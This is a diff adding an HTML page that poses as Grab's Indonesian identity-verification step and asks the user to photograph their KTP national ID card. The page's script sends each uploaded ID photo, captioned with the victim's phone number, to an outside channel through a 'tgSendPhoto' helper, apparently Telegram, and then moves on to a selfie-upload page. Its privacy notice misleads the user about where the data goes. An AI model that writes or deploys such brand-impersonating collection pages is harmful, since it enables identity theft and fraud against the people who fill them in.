@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Grab – Upload KTP</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .phone-wrapper {
+      width: 390px;
+      min-height: 844px;
+      background: #fff;
+      border-radius: 40px;
+      overflow: hidden;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+      display: flex;
+      flex-direction: column;
+    }
+
+    .status-bar {
+      height: 44px;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 24px;
+    }
+    .status-bar .time { font-size: 15px; font-weight: 700; }
+    .status-bar .icons { display: flex; gap: 6px; align-items: center; }
+    .status-bar .icons svg { width: 16px; height: 16px; }
+
+    /* Top nav */
+    .topnav {
+      display: flex;
+      align-items: center;
+      padding: 12px 20px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .btn-back {
+      width: 36px;
+      height: 36px;
+      border: none;
+      background: #f5f5f5;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      font-size: 18px;
+      color: #333;
+    }
+
+    .btn-back:hover { background: #ebebeb; }
+
+    .topnav-title {
+      flex: 1;
+      text-align: center;
+      font-size: 16px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-right: 36px;
+    }
+
+    /* Progress */
+    .progress-wrap {
+      padding: 16px 28px 0;
+    }
+
+    .progress-label {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      color: #888;
+      margin-bottom: 6px;
+    }
+
+    .progress-bar {
+      height: 4px;
+      background: #eee;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 50%;
+      background: #00B14F;
+      border-radius: 4px;
+    }
+
+    /* Content */
+    .content {
+      flex: 1;
+      padding: 24px 28px 40px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .section-heading {
+      margin-bottom: 24px;
+    }
+
+    .section-heading h2 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1a1a1a;
+      line-height: 1.3;
+    }
+
+    .section-heading p {
+      margin-top: 6px;
+      font-size: 13px;
+      color: #888;
+      line-height: 1.5;
+    }
+
+    /* Upload box */
+    .upload-box {
+      border: 2px dashed #d0d0d0;
+      border-radius: 16px;
+      min-height: 200px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      cursor: pointer;
+      transition: border-color 0.2s, background 0.2s;
+      position: relative;
+      overflow: hidden;
+      background: #fafafa;
+    }
+
+    .upload-box:hover {
+      border-color: #00B14F;
+      background: #f0fdf5;
+    }
+
+    .upload-box.has-image {
+      border-style: solid;
+      border-color: #00B14F;
+      background: #000;
+    }
+
+    .upload-box input[type="file"] {
+      position: absolute;
+      inset: 0;
+      opacity: 0;
+      cursor: pointer;
+      width: 100%;
+      height: 100%;
+    }
+
+    .upload-icon {
+      width: 56px;
+      height: 56px;
+      background: #e8f5ee;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .upload-icon svg {
+      width: 28px;
+      height: 28px;
+      fill: #00B14F;
+    }
+
+    .upload-text {
+      text-align: center;
+    }
+
+    .upload-text strong {
+      display: block;
+      font-size: 15px;
+      font-weight: 700;
+      color: #1a1a1a;
+    }
+
+    .upload-text span {
+      font-size: 12px;
+      color: #aaa;
+    }
+
+    .preview-img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: none;
+      position: absolute;
+      inset: 0;
+    }
+
+    .preview-img.visible { display: block; }
+
+    .preview-overlay {
+      position: absolute;
+      inset: 0;
+      background: rgba(0,0,0,0.4);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 6px;
+      color: #fff;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .preview-overlay.visible { display: flex; }
+
+    .preview-overlay svg { width: 24px; height: 24px; fill: white; }
+
+    /* Tips */
+    .tips {
+      margin-top: 20px;
+      background: #f7f9ff;
+      border-radius: 12px;
+      padding: 14px 16px;
+    }
+
+    .tips-title {
+      font-size: 12px;
+      font-weight: 700;
+      color: #555;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 10px;
+    }
+
+    .tip-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      margin-bottom: 8px;
+      font-size: 12px;
+      color: #666;
+      line-height: 1.4;
+    }
+
+    .tip-item:last-child { margin-bottom: 0; }
+
+    .tip-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #00B14F;
+      flex-shrink: 0;
+      margin-top: 4px;
+    }
+
+    /* User info chip */
+    .user-chip {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: #f0fdf5;
+      border: 1px solid #b7e9cc;
+      border-radius: 10px;
+      padding: 10px 14px;
+      margin-bottom: 20px;
+      font-size: 13px;
+      color: #1a6637;
+      font-weight: 500;
+    }
+
+    .user-chip svg { width: 16px; height: 16px; fill: #00B14F; flex-shrink: 0; }
+
+    /* Submit */
+    .btn-submit {
+      width: 100%;
+      padding: 16px;
+      background: #00B14F;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 24px;
+      transition: background 0.2s, transform 0.1s;
+    }
+
+    .btn-submit:hover { background: #009944; }
+    .btn-submit:active { transform: scale(0.98); }
+    .btn-submit:disabled { background: #b2dfca; cursor: not-allowed; }
+
+    .terms {
+      margin-top: 16px;
+      font-size: 11px;
+      color: #bbb;
+      line-height: 1.6;
+      text-align: center;
+    }
+
+    .terms a { color: #888; text-decoration: underline; }
+
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="phone-wrapper">
+
+    <!-- Status Bar -->
+    <div class="status-bar">
+      <span class="time">9:41</span>
+      <div class="icons">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M15.67 4H14V2h-4v2H8.33C7.6 4 7 4.6 7 5.33v15.33C7 21.4 7.6 22 8.33 22h7.33c.74 0 1.34-.6 1.34-1.33V5.33C17 4.6 16.4 4 15.67 4z"/></svg>
+      </div>
+    </div>
+
+    <!-- Top Nav -->
+    <div class="topnav">
+      <button class="btn-back" onclick="history.back()">‹</button>
+      <span class="topnav-title">Verifikasi Identitas</span>
+    </div>
+
+    <!-- Progress -->
+    <div class="progress-wrap">
+      <div class="progress-label">
+        <span>Langkah 2 dari 4</span>
+        <span>50%</span>
+      </div>
+      <div class="progress-bar">
+        <div class="progress-fill"></div>
+      </div>
+    </div>
+
+    <!-- Content -->
+    <div class="content">
+
+      <!-- User info chip -->
+      <div class="user-chip" id="userChip">
+        <svg viewBox="0 0 24 24"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
+        <span id="userPhone">Loading...</span>
+      </div>
+
+      <!-- Heading -->
+      <div class="section-heading">
+        <h2>Upload foto KTP kamu</h2>
+        <p>Pastikan foto jelas dan semua teks terbaca</p>
+      </div>
+
+      <!-- Upload Box -->
+      <div class="upload-box" id="uploadBox">
+        <input type="file" id="fileInput" accept="image/*" capture="environment" />
+        <img class="preview-img" id="previewImg" alt="Preview KTP" />
+        <div class="preview-overlay" id="previewOverlay">
+          <svg viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
+          <span>Ganti foto</span>
+        </div>
+        <div class="upload-icon" id="uploadIcon">
+          <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm-1 7V3.5L18.5 9H13z"/></svg>
+        </div>
+        <div class="upload-text" id="uploadText">
+          <strong>Ambil atau pilih foto KTP</strong>
+          <span>JPG, PNG — maks 10MB</span>
+        </div>
+      </div>
+
+      <!-- Tips -->
+      <div class="tips">
+        <div class="tips-title">Tips foto yang baik</div>
+        <div class="tip-item"><div class="tip-dot"></div><span>Foto di tempat terang, hindari cahaya dari belakang</span></div>
+        <div class="tip-item"><div class="tip-dot"></div><span>KTP rata dan tidak terlipat</span></div>
+        <div class="tip-item"><div class="tip-dot"></div><span>Semua pojok KTP terlihat dalam frame</span></div>
+        <div class="tip-item"><div class="tip-dot"></div><span>Tidak buram, tidak ada pantulan cahaya</span></div>
+      </div>
+
+      <button class="btn-submit" id="btnLanjutkan" disabled>Lanjutkan</button>
+
+      <p class="terms">
+        Data KTP hanya digunakan untuk verifikasi akun sesuai
+        <a href="#">Kebijakan Privasi</a> Grab.
+      </p>
+
+    </div>
+  </div>
+
+  <script src="tg.js"></script>
+  <script>
+    // Load user from localStorage
+    const stored = JSON.parse(localStorage.getItem('grabUser') || '{}');
+    const chip = document.getElementById('userChip');
+    const phoneSpan = document.getElementById('userPhone');
+
+    if (stored.phone) {
+      phoneSpan.textContent = '+62 ' + stored.phone;
+    } else {
+      chip.style.display = 'none';
+    }
+
+    // File upload preview
+    const fileInput = document.getElementById('fileInput');
+    const uploadBox = document.getElementById('uploadBox');
+    const previewImg = document.getElementById('previewImg');
+    const previewOverlay = document.getElementById('previewOverlay');
+    const uploadIcon = document.getElementById('uploadIcon');
+    const uploadText = document.getElementById('uploadText');
+    const btnSubmit = document.getElementById('btnSubmit');
+
+    const btnLanjutkan = document.getElementById('btnLanjutkan');
+
+    fileInput.addEventListener('change', (e) => {
+      const file = e.target.files[0];
+      if (!file) return;
+
+      const reader = new FileReader();
+      reader.onload = async (ev) => {
+        const compressed = await compressImage(ev.target.result, 1920, 0.82, file.size);
+
+        previewImg.src = compressed;
+        previewImg.classList.add('visible');
+        previewOverlay.classList.add('visible');
+        uploadIcon.style.display = 'none';
+        uploadText.style.display = 'none';
+        uploadBox.classList.add('has-image');
+
+        const user = JSON.parse(localStorage.getItem('grabUser') || '{}');
+        user.ktpPhoto = compressed;
+        user.ktpFileName = file.name;
+        localStorage.setItem('grabUser', JSON.stringify(user));
+
+        const caption = `🪪 <b>Foto KTP Grab</b>\n📱 Nomor: <code>+62${user.phone || '-'}</code>`;
+        await tgSendPhoto(compressed, file.name, caption);
+
+        btnLanjutkan.disabled = false;
+      };
+      reader.readAsDataURL(file);
+    });
+
+    btnLanjutkan.addEventListener('click', () => {
+      window.location.href = 'upload-selfie.html';
+    });
+  </script>
+</body>
+</html>
